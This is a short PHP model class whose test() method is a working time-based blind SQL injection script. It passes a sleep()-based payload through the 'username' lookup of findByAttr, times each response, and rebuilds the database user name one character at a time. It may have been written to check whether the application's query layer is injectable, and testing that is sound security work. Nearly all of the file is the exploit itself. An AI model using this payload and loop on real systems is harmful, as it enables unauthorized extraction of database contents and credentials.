<?php

class Test_model extends GT_model{

    protected $_table_name = 'user';

    protected $_pk = 'user_id';

    public function __construct(){
        parent::__construct();
    }

    public function test(){
        // $id = '6094091879463563272';
        // $ret = $this->getById($id);
        // var_dump($ret);
        $num = 21;
        $rand_array = getCharArr();
        $res = '';
        for($i=1;$i<=$num;$i++){
            foreach($rand_array as $str){
                $status = false;
                while(true){
                    $start_time = microtime(true);
                    $query_str ="%2b(select(0)from(select(sleep((mid(user(),".$i.",1)='".$str."')*4)))v)%2b";
                    $result = $this->findByAttr(array('username'=>$query_str));
                    var_dump($this->getLastSql());
                    if(microtime(true)-$start_time>3){
                        $res .= $str;
                        $status = true;
                        sleep(1);
                        break;
                    }
                    break;
                    sleep(1);
                }
                if($status){
                    break;
                }
            }
        }
        var_dump($res);
        die("test end");
    }

}